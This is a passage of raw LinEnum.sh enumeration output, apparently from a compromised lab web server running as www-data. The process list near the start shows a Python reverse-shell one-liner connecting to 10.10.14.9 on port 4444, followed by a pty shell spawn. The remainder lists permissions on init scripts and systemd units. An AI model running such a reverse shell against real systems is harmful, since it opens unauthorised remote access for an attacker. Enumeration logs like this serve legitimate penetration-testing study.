Apr23 0:00 /usr/sbin/apache2 -k start www-data 859 0.0 1.1 256204 11488 ? S Apr23 0:00 /usr/sbin/apache2 -k start root 883 0.0 0.0 0 0 ? S Apr23 0:29 [kworker/0:1] root 1284 0.0 0.0 0 0 ? S Apr23 0:00 [kworker/0:0] root 3032 0.0 0.0 0 0 ? S Apr23 0:01 [kworker/u256:0] root 3277 0.0 0.0 0 0 ? S Apr23 0:01 [kworker/u256:1] www-data 6303 0.0 0.9 256172 9188 ? S 02:38 0:00 /usr/sbin/apache2 -k start www-data 6304 0.0 1.0 256204 10704 ? S 02:38 0:00 /usr/sbin/apache2 -k start www-data 6374 0.0 0.9 256140 9040 ? S 02:47 0:00 /usr/sbin/apache2 -k start www-data 6375 0.0 1.1 256308 11552 ? S 02:47 0:00 /usr/sbin/apache2 -k start www-data 6376 0.0 1.1 256196 11324 ? S 02:47 0:00 /usr/sbin/apache2 -k start www-data 6410 0.0 0.0 4508 848 ? S 02:53 0:00 sh -c cd /var/www/html/dev; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( 10.10.14.9 ,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ /bin/sh , -i ]);' 2 1 www-data 6411 0.0 0.9 39980 9724 ? S 02:53 0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( 10.10.14.9 ,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ /bin/sh , -i ]); www-data 6412 0.0 0.0 4508 848 ? S 02:53 0:00 /bin/sh -i www-data 6421 0.0 0.6 32168 6812 ? S 02:55 0:00 python -c import pty; pty.spawn( /bin/bash ) www-data 6422 0.0 0.3 18216 3292 pts/0 Ss 02:55 0:00 /bin/bash www-data 6893 0.0 0.3 19016 3880 pts/0 S+ 02:58 0:00 bash LinEnum.sh www-data 6894 0.0 0.3 19056 3420 pts/0 S+ 02:58 0:00 bash LinEnum.sh www-data 6895 0.0 0.0 4384 756 pts/0 S+ 02:58 0:00 tee -a www-data 7092 0.0 0.2 19040 2748 pts/0 S+ 02:58 0:00 bash LinEnum.sh www-data 7093 0.0 0.2 34424 2848 pts/0 R+ 02:58 0:00 ps aux [-] Process binaries and associated permissions (from above list): -rwxr-xr-x 1 root root 1037528 Jun 24 2016 /bin/bash lrwxrwxrwx 1 root root 4 Dec 4 2017 /bin/sh - dash -rwxr-xr-x 1 root root 326224 Jan 18 2017 /lib/systemd/systemd-journald -rwxr-xr-x 1 root root 618520 Jan 18 2017 /lib/systemd/systemd-logind -rwxr-xr-x 1 root root 141904 Jan 18 2017 /lib/systemd/systemd-timesyncd -rwxr-xr-x 1 root root 453240 Jan 18 2017 /lib/systemd/systemd-udevd -rwxr-xr-x 1 root root 44104 Dec 16 2016 /sbin/agetty lrwxrwxrwx 1 root root 20 Dec 4 2017 /sbin/init - /lib/systemd/systemd -rwxr-xr-x 1 root root 224208 Jan 12 2017 /usr/bin/dbus-daemon -rwxr-xr-x 1 root root 44528 Feb 9 2017 /usr/bin/vmtoolsd -rwxr-xr-x 1 root root 164928 Nov 3 2016 /usr/lib/accountsservice/accounts-daemon -rwxr-xr-x 1 root root 662496 Sep 18 2017 /usr/sbin/apache2 -rwxr-xr-x 1 root root 44472 Apr 5 2016 /usr/sbin/cron -rwxr-xr-x 1 root root 599328 Apr 5 2016 /usr/sbin/rsyslogd [-] /etc/init.d/ binary permissions: total 252 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 1355 Dec 4 2017 .depend.boot -rw-r--r-- 1 root root 471 Dec 4 2017 .depend.start -rw-r--r-- 1 root root 667 Dec 4 2017 .depend.stop -rw-r--r-- 1 root root 2427 Jan 19 2016 README -rwxr-xr-x 1 root root 2210 Apr 5 2016 apache-htcacheclean -rwxr-xr-x 1 root root 8087 Apr 5 2016 apache2 -rwxr-xr-x 1 root root 6250 Oct 4 2016 apparmor -rwxr-xr-x 1 root root 1275 Jan 19 2016 bootmisc.sh -rwxr-xr-x 1 root root 3807 Jan 19 2016 checkfs.sh -rwxr-xr-x 1 root root 1098 Jan 19 2016 checkroot-bootclean.sh -rwxr-xr-x 1 root root 9353 Jan 19 2016 checkroot.sh -rwxr-xr-x 1 root root 1343 Apr 4 2016 console-setup -rwxr-xr-x 1 root root 3049 Apr 5 2016 cron -rwxr-xr-x 1 root root 2813 Dec 1 2015 dbus -rwxr-xr-x 1 root root 1105 Mar 15 2016 grub-common -rwxr-xr-x 1 root root 1336 Jan 19 2016 halt -rwxr-xr-x 1 root root 1423 Jan 19 2016 hostname.sh -rwxr-xr-x 1 root root 3809 Mar 12 2016 hwclock.sh -rwxr-xr-x 1 root root 2372 Apr 11 2016 irqbalance -rwxr-xr-x 1 root root 1804 Apr 4 2016 keyboard-setup -rwxr-xr-x 1 root root 1300 Jan 19 2016 killprocs -rwxr-xr-x 1 root root 2087 Dec 20 2015 kmod -rwxr-xr-x 1 root root 703 Jan 19 2016 mountall-bootclean.sh -rwxr-xr-x 1 root root 2301 Jan 19 2016 mountall.sh -rwxr-xr-x 1 root root 1461 Jan 19 2016 mountdevsubfs.sh -rwxr-xr-x 1 root root 1564 Jan 19 2016 mountkernfs.sh -rwxr-xr-x 1 root root 711 Jan 19 2016 mountnfs-bootclean.sh -rwxr-xr-x 1 root root 2456 Jan 19 2016 mountnfs.sh -rwxr-xr-x 1 root root 4771 Jul 19 2015 networking -rwxr-xr-x 1 root root 1581 Oct 15 2015 ondemand -rwxr-xr-x 1 root root 1578 Sep 17 2016 open-vm-tools -rwxr-xr-x 1 root root 1366 Nov 15 2015 plymouth -rwxr-xr-x 1 root root 752 Nov 15 2015 plymouth-log -rwxr-xr-x 1 root root 1192 Sep 5 2015 procps -rwxr-xr-x 1 root root 6366 Jan 19 2016 rc -rwxr-xr-x 1 root root 820 Jan 19 2016 rc.local -rwxr-xr-x 1 root root 117 Jan 19 2016 rcS -rwxr-xr-x 1 root root 661 Jan 19 2016 reboot -rwxr-xr-x 1 root root 4149 Nov 23 2015 resolvconf -rwxr-xr-x 1 root root 4355 Jul 10 2014 rsync -rwxr-xr-x 1 root root 2796 Feb 3 2016 rsyslog -rwxr-xr-x 1 root root 3927 Jan 19 2016 sendsigs -rwxr-xr-x 1 root root 597 Jan 19 2016 single -rw-r--r-- 1 root root 1087 Jan 19 2016 skeleton -rwxr-xr-x 1 root root 6087 Apr 12 2016 udev -rwxr-xr-x 1 root root 2049 Aug 7 2014 ufw -rwxr-xr-x 1 root root 2737 Jan 19 2016 umountfs -rwxr-xr-x 1 root root 2202 Jan 19 2016 umountnfs.sh -rwxr-xr-x 1 root root 1879 Jan 19 2016 umountroot -rwxr-xr-x 1 root root 3111 Jan 19 2016 urandom -rwxr-xr-x 1 root root 1306 Dec 16 2016 uuidd -rwxr-xr-x 1 root root 2757 Nov 10 2015 x11-common [-] /etc/init/ config file permissions: total 124 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 3735 Oct 4 2016 apparmor.conf -rw-r--r-- 1 root root 250 Apr 4 2016 console-font.conf -rw-r--r-- 1 root root 509 Apr 4 2016 console-setup.conf -rw-r--r-- 1 root root 297 Apr 5 2016 cron.conf -rw-r--r-- 1 root root 482 Sep 1 2015 dbus.conf -rw-r--r-- 1 root root 1247 Jun 1 2015 friendly-recovery.conf -rw-r--r-- 1 root root 284 Jul 23 2013 hostname.conf -rw-r--r-- 1 root root 300 May 21 2014 hostname.sh.conf -rw-r--r-- 1 root root 561 Mar 14 2016 hwclock-save.conf -rw-r--r-- 1 root root 674 Mar 14 2016 hwclock.conf -rw-r--r-- 1 root root 109 Mar 14 2016 hwclock.sh.conf -rw-r--r-- 1 root root 597 Apr 11 2016 irqbalance.conf -rw-r--r-- 1 root root 689 Aug 20 2015 kmod.conf -rw-r--r-- 1 root root 530 Jun 2 2015 network-interface-container.conf -rw-r--r-- 1 root root 1756 Jun 2 2015 network-interface-security.conf -rw-r--r-- 1 root root 933 Jun 2 2015 network-interface.conf -rw-r--r-- 1 root root 2493 Jun 2 2015 networking.conf -rw-r--r-- 1 root root 568 Feb 1 2016 passwd.conf -rw-r--r-- 1 root root 363 Jun 5 2014 procps-instance.conf -rw-r--r-- 1 root root 119 Jun 5 2014 procps.conf -rw-r--r-- 1 root root 457 Jun 3 2015 resolvconf.conf -rw-r--r-- 1 root root 426 Dec 2 2015 rsyslog.conf -rw-r--r-- 1 root root 230 Apr 4 2016 setvtrgb.conf -rw-r--r-- 1 root root 337 Apr 12 2016 udev.conf -rw-r--r-- 1 root root 360 Apr 12 2016 udevmonitor.conf -rw-r--r-- 1 root root 352 Apr 12 2016 udevtrigger.conf -rw-r--r-- 1 root root 473 Aug 7 2014 ufw.conf -rw-r--r-- 1 root root 683 Feb 24 2015 ureadahead-other.conf -rw-r--r-- 1 root root 889 Feb 24 2015 ureadahead.conf [-] /lib/systemd/* config file permissions: /lib/systemd/: total 8.2M drwxr-xr-x 26 root root 12K Dec 4 2017 system drwxr-xr-x 2 root root 4.0K Dec 4 2017 system-sleep drwxr-xr-x 2 root root 4.0K Dec 4 2017 system-preset drwxr-xr-x 2 root root 4.0K Dec 4 2017 system-generators drwxr-xr-x 2 root root 4.0K Dec 4 2017 network -rwxr-xr-x 1 root root 443K Jan 18 2017 systemd-udevd -rwxr-xr-x 1 root root 15K Jan 18 2017 systemd-ac-power -rwxr-xr-x 1 root root 47K Jan 18 2017 systemd-binfmt -rwxr-xr-x 1 root root 103K Jan 18 2017 systemd-bootchart -rwxr-xr-x 1 root root 91K Jan 18 2017 systemd-cryptsetup -rwxr-xr-x 1 root root 75K Jan 18 2017 systemd-fsckd -rwxr-xr-x 1 root root 276K Jan 18 2017 systemd-initctl -rwxr-xr-x 1 root root 824K Jan 18 2017 systemd-networkd -rwxr-xr-x 1 root root 35K Jan 18 2017 systemd-quotacheck -rwxr-xr-x 1 root root 657K Jan 18 2017 systemd-resolved -rwxr-xr-x 1 root root 35K Jan 18 2017 systemd-user-sessions -rwxr-xr-x 1 root root 55K Jan 18 2017 systemd-activate -rwxr-xr-x 1 root root 91K Jan 18 2017 systemd-backlight -rwxr-xr-x 1 root root 352K Jan 18 2017 systemd-bus-proxyd -rwxr-xr-x 1 root root 31K Jan 18 2017 systemd-hibernate-resume -rwxr-xr-x 1 root root 340K Jan 18 2017 systemd-localed -rwxr-xr-x 1 root root 605K Jan 18 2017 systemd-logind -rwxr-xr-x 1 root root 123K Jan 18 2017 systemd-networkd-wait-online -rwxr-xr-x 1 root root 35K Jan 18 2017 systemd-random-seed -rwxr-xr-x 1 root root 31K Jan 18 2017 systemd-reply-password -rwxr-xr-x 1 root root 91K Jan 18 2017 systemd-rfkill -rwxr-xr-x 1 root root 143K Jan 18 2017 systemd-shutdown -rwxr-xr-x 1 root root 71K Jan 18 2017 systemd-sleep -rwxr-xr-x 1 root root 51K Jan 18 2017 systemd-sysctl -rwxr-xr-x 1 root root 333K Jan 18 2017 systemd-timedated -rwxr-xr-x 1 root root 139K Jan 18 2017 systemd-timesyncd -rwxr-xr-x 1 root root 276K Jan 18 2017 systemd-update-utmp -rwxr-xr-x 1 root root 1.6M Jan 18 2017 systemd -rwxr-xr-x 1 root root 268K Jan 18 2017 systemd-cgroups-agent -rwxr-xr-x 1 root root 301K Jan 18 2017 systemd-fsck -rwxr-xr-x 1 root root 332K Jan 18 2017 systemd-hostnamed -rwxr-xr-x 1 root root 319K Jan 18 2017 systemd-journald -rwxr-xr-x 1 root root 51K Jan 18 2017 systemd-modules-load -rwxr-xr-x 1 root root 51K Jan 18 2017 systemd-remount-fs -rwxr-xr-x 1 root root 91K Jan 18 2017 systemd-socket-proxyd -rwxr-xr-x 1 root root 1.3K Jan 12 2017 systemd-sysv-install drwxr-xr-x 2 root root 4.0K Apr 12 2016 system-shutdown /lib/systemd/system: total 792K drwxr-xr-x 2 root root 4.0K Dec 4 2017 apache2.service.d drwxr-xr-x 2 root root 4.0K Dec 4 2017 halt.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 initrd-switch-root.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 kexec.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 multi-user.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 poweroff.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 reboot.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 sysinit.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 sockets.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 timers.target.wants lrwxrwxrwx 1 root root 21 Dec 4 2017 udev.service - systemd-udevd.service lrwxrwxrwx 1 root root 9 Dec 4 2017 umountfs.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 umountnfs.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 umountroot.service - /dev/null lrwxrwxrwx 1 root root 27 Dec 4 2017 urandom.service - systemd-random-seed.service lrwxrwxrwx 1 root root 9 Dec 4 2017 x11-common.service - /dev/null drwxr-xr-x 2 root root 4.0K Dec 4 2017 systemd-timesyncd.service.d lrwxrwxrwx 1 root root 9 Dec 4 2017 sendsigs.service - /dev/null drwxr-xr-x 2 root root 4.0K Dec 4 2017 sigpwr.target.wants lrwxrwxrwx 1 root root 9 Dec 4 2017 single.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 stop-bootlogd-single.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 stop-bootlogd.service - /dev/null drwxr-xr-x 2 root root 4.0K Dec 4 2017 rescue.target.wants drwxr-xr-x 2 root root 4.0K Dec 4 2017 resolvconf.service.wants lrwxrwxrwx 1 root root 9 Dec 4 2017 rmnologin.service - /dev/null lrwxrwxrwx 1 root root 15 Dec 4 2017 runlevel0.target - poweroff.target lrwxrwxrwx 1 root root 13 Dec 4 2017 runlevel1.target - rescue.target lrwxrwxrwx 1 root root 17 Dec 4 2017 runlevel2.target - multi-user.target lrwxrwxrwx 1 root root 17 Dec 4 2017 runlevel3.target - multi-user.target lrwxrwxrwx 1 root root 17 Dec 4 2017 runlevel4.target - multi-user.target lrwxrwxrwx 1 root root 16 Dec 4 2017 runlevel5.target - graphical.target lrwxrwxrwx 1 root root 13 Dec 4 2017 runlevel6.target - reboot.target lrwxrwxrwx 1 root root 22 Dec 4 2017 procps.service - systemd-sysctl.service drwxr-xr-x 2 root root 4.0K Dec 4 2017 rc-local.service.d lrwxrwxrwx 1 root root 16 Dec 4 2017 rc.local.service - rc-local.service lrwxrwxrwx 1 root root 9 Dec 4 2017 rc.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 rcS.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 reboot.service - /dev/null drwxr-xr-x 2 root root 4.0K Dec 4 2017 graphical.target.wants lrwxrwxrwx 1 root root 9 Dec 4 2017 halt.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 hostname.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 hwclock.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 killprocs.service - /dev/null lrwxrwxrwx 1 root root 28 Dec 4 2017 kmod.service - systemd-modules-load.service drwxr-xr-x 2 root root 4.0K Dec 4 2017 local-fs.target.wants lrwxrwxrwx 1 root root 28 Dec 4 2017 module-init-tools.service - systemd-modules-load.service lrwxrwxrwx 1 root root 9 Dec 4 2017 motd.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 mountall-bootclean.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 mountall.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 mountdevsubfs.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 mountkernfs.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 mountnfs-bootclean.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 mountnfs.service - /dev/null lrwxrwxrwx 1 root root 16 Dec 4 2017 default.target - graphical.target lrwxrwxrwx 1 root root 9 Dec 4 2017 fuse.service - /dev/null drwxr-xr-x 2 root root 4.0K Dec 4 2017 getty.target.wants lrwxrwxrwx 1 root root 14 Dec 4 2017 autovt@.service - getty@.service lrwxrwxrwx 1 root root 9 Dec 4 2017 bootlogd.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 bootlogs.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 bootmisc.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 checkfs.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 checkroot-bootclean.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 checkroot.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 cryptdisks-early.service - /dev/null lrwxrwxrwx 1 root root 9 Dec 4 2017 cryptdisks.service - /dev/null lrwxrwxrwx 1 root root 13 Dec 4 2017 ctrl-alt-del.target - reboot.target lrwxrwxrwx 1 root root 25 Dec 4 2017 dbus-org.freedesktop.hostname1.service - systemd-hostnamed.service lrwxrwxrwx 1 root root 23 Dec 4 2017 dbus-org.freedesktop.locale1.service - systemd-localed.service lrwxrwxrwx 1 root root 22 Dec 4 2017 dbus-org.freedesktop.login1.service - systemd-logind.service lrwxrwxrwx 1 root root 24 Dec 4 2017 dbus-org.freedesktop.network1.service - systemd-networkd.service lrwxrwxrwx 1 root root 24 Dec 4 2017 dbus-org.freedesktop.resolve1.service - systemd-resolved.service lrwxrwxrwx 1 root root 25 Dec 4 2017 dbus-org.freedesktop.timedate1.service - systemd-timedated.service drwxr-xr-x 2 root root 4.0K Feb 15 2017 busnames.target.wants -rw-r--r-- 1 root root 460 Feb 9 2017 run-vmblock-fuse.mount -rw-r--r-- 1 root root 269 Jan 31 2017 setvtrgb.service -rw-r--r-- 1 root root 770 Jan 18 2017 console-getty.service -rw-r--r-- 1 root root 742 Jan 18 2017 console-shell.service -rw-r--r-- 1 root root 791 Jan 18 2017 container-getty@.service -rw-r--r-- 1 root root 1010 Jan 18 2017 debug-shell.service -rw-r--r-- 1 root root 1009 Jan 18 2017 emergency.service -rw-r--r-- 1 root root 1.5K Jan 18 2017 getty@.service -rw-r--r-- 1 root root 630 Jan 18 2017 initrd-cleanup.service -rw-r--r-- 1 root root 790 Jan 18 2017 initrd-parse-etc.service -rw-r--r-- 1 root root 640 Jan 18 2017 initrd-switch-root.service -rw-r--r-- 1 root root 664 Jan 18 2017 initrd-udevadm-cleanup-db.service -rw-r--r-- 1 root root 677 Jan 18 2017 kmod-static-nodes.service -rw-r--r-- 1 root root 473 Jan 18 2017 mail-transport-agent.target -rw-r--r-- 1 root root 568 Jan 18 2017 quotaon.service -rw-r--r-- 1 root root 612 Jan 18 2017 rc-local.service -rw-r--r-- 1 root root 978 Jan 18 2017 rescue.service -rw-r--r-- 1 root root 1.1K Jan 18 2017 serial-getty@.service -rw-r--r-- 1 root root 653 Jan 18 2017 systemd-ask-password-console.service -rw-r--r-- 1 root root 681 Jan 18 2017 systemd-ask-password-wall.service -rw-r--r-- 1 root root 724 Jan 18 2017 systemd-backlight@.service -rw-r--r-- 1 root root 959 Jan 18 2017 systemd-binfmt.service -rw-r--r-- 1 root root 650 Jan 18 2017 systemd-bootchart.service -rw-r--r-- 1 root root 1.0K Jan 18 2017 systemd-bus-proxyd.service -rw-r--r-- 1 root root 497 Jan 18 2017 systemd-exit.service -rw-r--r-- 1 root root 674 Jan 18 2017 systemd-fsck-root.service -rw-r--r-- 1 root root 648 Jan 18 2017 systemd-fsck@.service -rw-r--r-- 1 root root 551 Jan 18 2017 systemd-fsckd.service -rw-r--r-- 1 root root 544 Jan 18 2017 systemd-halt.service -rw-r--r-- 1 root root 631 Jan 18 2017 systemd-hibernate-resume@.service -rw-r--r-- 1 root root 501 Jan 18 2017 systemd-hibernate.service -rw-r--r-- 1 root root 710 Jan 18 2017 systemd-hostnamed.service -rw-r--r-- 1 root root 778 Jan 18 2017 systemd-hwdb-update.service -rw-r--r-- 1 root root 519 Jan 18 2017 systemd-hybrid-sleep.service -rw-r--r-- 1 root root 480 Jan 18 2017 systemd-initctl.service -rw-r--r-- 1 root root 731 Jan 18 2017 systemd-journal-flush.service -rw-r--r-- 1 root root 1.3K Jan 18 2017 systemd-journald.service -rw-r--r-- 1 root root 557 Jan 18 2017 systemd-kexec.service -rw-r--r-- 1 root root 691 Jan 18 2017 systemd-localed.service -rw-r--r-- 1 root root 1.2K Jan 18 2017 systemd-logind.service -rw-r--r-- 1 root root 693 Jan 18 2017 systemd-machine-id-commit.service -rw-r--r-- 1 root root 967 Jan 18 2017 systemd-modules-load.service -rw-r--r-- 1 root root 685 Jan 18 2017 systemd-networkd-wait-online.service -rw-r--r-- 1 root root 1.3K Jan 18 2017 systemd-networkd.service -rw-r--r-- 1 root root 553 Jan 18 2017 systemd-poweroff.service -rw-r--r-- 1 root root 614 Jan 18 2017 systemd-quotacheck.service -rw-r--r-- 1 root root 717 Jan 18 2017 systemd-random-seed.service -rw-r--r-- 1 root root 548 Jan 18 2017 systemd-reboot.service -rw-r--r-- 1 root root 757 Jan 18 2017 systemd-remount-fs.service -rw-r--r-- 1 root root 907 Jan 18 2017 systemd-resolved.service -rw-r--r-- 1 root root 696 Jan 18 2017 systemd-rfkill.service -rw-r--r-- 1 root root 497 Jan 18 2017 systemd-suspend.service -rw-r--r-- 1 root root 649 Jan 18 2017 systemd-sysctl.service -rw-r--r-- 1 root root 655 Jan 18 2017 systemd-timedated.service -rw-r--r-- 1 root root 1.1K Jan 18 2017 systemd-timesyncd.service -rw-r--r-- 1 root root 598 Jan 18 2017 systemd-tmpfiles-clean.service -rw-r--r-- 1 root root 703 Jan 18 2017 systemd-tmpfiles-setup-dev.service -rw-r--r-- 1 root root 683 Jan 18 2017 systemd-tmpfiles-setup.service -rw-r--r-- 1 root root 823 Jan 18 2017 systemd-udev-settle.service -rw-r--r-- 1 root root 743 Jan 18 2017 systemd-udev-trigger.service -rw-r--r-- 1 root root 825 Jan 18 2017 systemd-udevd.service -rw-r--r-- 1 root root 757 Jan 18 2017 systemd-update-utmp-runlevel.service -rw-r--r-- 1 root root 754 Jan 18 2017 systemd-update-utmp.service -rw-r--r-- 1 root root 573 Jan 18 2017 systemd-user-sessions.service -rw-r--r-- 1 root root 528 Jan 18 2017 user@.service -rw-r--r-- 1 root root 403 Jan 18 2017 -.slice -rw-r--r-- 1 root root 879 Jan 18 2017 basic.target -rw-r--r-- 1 root root 379 Jan 18 2017 bluetooth.target -rw-r--r-- 1 root root 358 Jan 18 2017 busnames.target -rw-r--r-- 1 root root 394 Jan 18 2017 cryptsetup-pre.target -rw-r--r-- 1 root root 366 Jan 18 2017 cryptsetup.target -rw-r--r-- 1 root root 670 Jan 18 2017 dev-hugepages.mount -rw-r--r-- 1 root root 624 Jan 18 2017 dev-mqueue.mount -rw-r--r-- 1 root root 431 Jan 18 2017 emergency.target -rw-r--r-- 1 root root 501 Jan 18 2017 exit.target -rw-r--r-- 1 root root 440 Jan 18 2017 final.target -rw-r--r-- 1 root root 460 Jan 18 2017 getty.target -rw-r--r-- 1 root root 558 Jan 18 2017 graphical.target -rw-r--r-- 1 root root 487 Jan 18 2017 halt.target -rw-r--r-- 1 root root 447 Jan 18 2017 hibernate.target -rw-r--r-- 1 root root 468 Jan 18 2017 hybrid-sleep.target -rw-r--r-- 1 root root 553 Jan 18 2017 initrd-fs.target -rw-r--r-- 1 root root 526 Jan 18 2017 initrd-root-fs.target -rw-r--r-- 1 root root 691 Jan 18 2017 initrd-switch-root.target -rw-r--r-- 1 root root 671 Jan 18 2017 initrd.target -rw-r--r-- 1 root root 501 Jan 18 2017 kexec.target -rw-r--r-- 1 root root 395 Jan 18 2017 local-fs-pre.target -rw-r--r-- 1 root root 507 Jan 18 2017 local-fs.target -rw-r--r-- 1 root root 405 Jan 18 2017 machine.slice -rw-r--r-- 1 root root 492 Jan 18 2017 multi-user.target -rw-r--r-- 1 root root 464 Jan 18 2017 network-online.target -rw-r--r-- 1 root root 461 Jan 18 2017 network-pre.target -rw-r--r-- 1 root root 480 Jan 18 2017 network.target -rw-r--r-- 1 root root 514 Jan 18 2017 nss-lookup.target -rw-r--r-- 1 root root 473 Jan 18 2017 nss-user-lookup.target -rw-r--r-- 1 root root 354 Jan 18 2017 paths.target -rw-r--r-- 1 root root 552 Jan 18 2017 poweroff.target -rw-r--r-- 1 root root 377 Jan 18 2017 printer.target -rw-r--r-- 1 root root 693 Jan 18 2017 proc-sys-fs-binfmt_misc.automount -rw-r--r-- 1 root root 603 Jan 18 2017 proc-sys-fs-binfmt_misc.mount -rw-r--r-- 1 root root 543 Jan 18 2017 reboot.target -rw-r--r-- 1 root root 396 Jan 18 2017 remote-fs-pre.target -rw-r--r-- 1 root root 482 Jan 18 2017 remote-fs.target -rw-r--r-- 1 root root 486 Jan 18 2017 rescue.target -rw-r--r-- 1 root root 500 Jan 18 2017 rpcbind.target -rw-r--r-- 1 root root 402 Jan 18 2017 shutdown.target -rw-r--r-- 1 root root 362 Jan 18 2017 sigpwr.target -rw-r--r-- 1 root root 420 Jan 18 2017 sleep.target -rw-r--r-- 1 root root 409 Jan 18 2017 slices.target -rw-r--r-- 1 root root 380 Jan 18 2017 smartcard.target -rw-r--r-- 1 root root 356 Jan 18 2017 sockets.target -rw-r--r-- 1 root root 380 Jan 18 2017 sound.target -rw-r--r-- 1 root root 441 Jan 18 2017 suspend.target -rw-r--r-- 1 root root 353 Jan 18 2017 swap.target -rw-r--r-- 1 root root 715 Jan 18 2017 sys-fs-fuse-connections.mount -rw-r--r-- 1 root root 719 Jan 18 2017 sys-kernel-config.mount -rw-r--r-- 1 root root 662 Jan 18 2017 sys-kernel-debug.mount -rw-r--r-- 1 root root 518 Jan 18 2017 sysinit.target -rw-r--r-- 1 root root 1.3K Jan 18 2017 syslog.socket -rw-r--r-- 1 root root 585 Jan 18 2017 system-update.target -rw-r--r-- 1 root root 436 Jan 18 2017 system.slice -rw-r--r-- 1 root root 646 Jan 18 2017 systemd-ask-password-console.path -rw-r--r-- 1 root root 574 Jan 18 2017 systemd-ask-password-wall.path -rw-r--r-- 1 root root 409 Jan 18 2017 systemd-bus-proxyd.socket -rw-r--r-- 1 root root 540 Jan 18 2017 systemd-fsckd.socket -rw-r--r-- 1 root root 524 Jan 18 2017 systemd-initctl.socket -rw-r--r-- 1 root root 607 Jan 18 2017 systemd-journald-audit.socket -rw-r--r-- 1 root root 1.1K Jan 18 2017 systemd-journald-dev-log.socket -rw-r--r-- 1 root root 842 Jan 18 2017 systemd-journald.socket -rw-r--r-- 1 root root 591 Jan 18 2017 systemd-networkd.socket -rw-r--r-- 1 root root 617 Jan 18 2017 systemd-rfkill.socket -rw-r--r-- 1 root root 450 Jan 18 2017 systemd-tmpfiles-clean.timer -rw-r--r-- 1 root root 578 Jan 18 2017 systemd-udevd-control.socket -rw-r--r-- 1 root root 570 Jan 18 2017 systemd-udevd-kernel.socket -rw-r--r-- 1 root root 395 Jan 18 2017 time-sync.target -rw-r--r-- 1 root root 405 Jan 18 2017 timers.target -rw-r--r-- 1 root root 417 Jan 18 2017 umount.target -rw-r--r-- 1 root root 392 Jan 18 2017 user.slice -rw-r--r-- 1 root root 663 Jan 18 2017 systemd-networkd-resolvconf-update.service -rw-r--r-- 1 root root 153 Jan 17 2017 apt-daily.service -rw-r--r-- 1 root root 162 Jan 17 2017 apt-daily.timer -rw-r--r-- 1 root root 342 Jan 13 2017 getty-static.service -rw-r--r-- 1 root root 153 Jan 13 2017 sigpwr-container-shutdown.service -rw-r--r-- 1 root root 152 Jan 13 2017 systemd-networkd-resolvconf-update.path -rw-r--r-- 1 root root 491 Jan 12 2017 dbus.service -rw-r--r-- 1 root root 106 Jan 12 2017 dbus.socket -rw-r--r-- 1 root root 189 Dec 16 2016 uuidd.service -rw-r--r-- 1 root root 126 Dec 16 2016 uuidd.socket -rw-r--r-- 1 root root 735 Nov 30 2016 networking.service -rw-r--r-- 1 root root 497 Nov 30 2016 ifup@.service -rw-r--r-- 1 root root 631 Nov 3 2016 accounts-daemon.service -rw-r--r-- 1 root root 251 Sep 17 2016 open-vm-tools.service -rw-r--r-- 1 root root 285 Jun 16 2016 keyboard-setup.service -rw-r--r-- 1 root root 288 Jun 16 2016 console-setup.service lrwxrwxrwx 1 root root 27 May 10 2016 plymouth-log.service - plymouth-read-write.service lrwxrwxrwx 1 root root 21 May 10 2016 plymouth.service - plymouth-quit.service -rw-r--r-- 1 root root 412 May 10 2016 plymouth-halt.service -rw-r--r-- 1 root root 426 May 10 2016 plymouth-kexec.service -rw-r--r-- 1 root root 421 May 10 2016 plymouth-poweroff.service -rw-r--r-- 1 root root 200 May 10 2016 plymouth-quit-wait.service -rw-r--r-- 1 root root 194 May 10 2016 plymouth-quit.service -rw-r--r-- 1 root root 244 May 10 2016 plymouth-read-write.service -rw-r--r-- 1 root root 416 May 10 2016 plymouth-reboot.service -rw-r--r-- 1 root root 532 May 10 2016 plymouth-start.service -rw-r--r-- 1 root root 291 May 10 2016 plymouth-switch-root.service -rw-r--r-- 1 root root 490 May 10 2016 systemd-ask-password-plymouth.path -rw-r--r-- 1 root root 467 May 10 2016 systemd-ask-password-plymouth.service drwxr-xr-x 2 root root 4.0K Apr 12 2016 runlevel1.target.wants drwxr-xr-x 2 root root 4.0K Apr 12 2016 runlevel2.target.wants 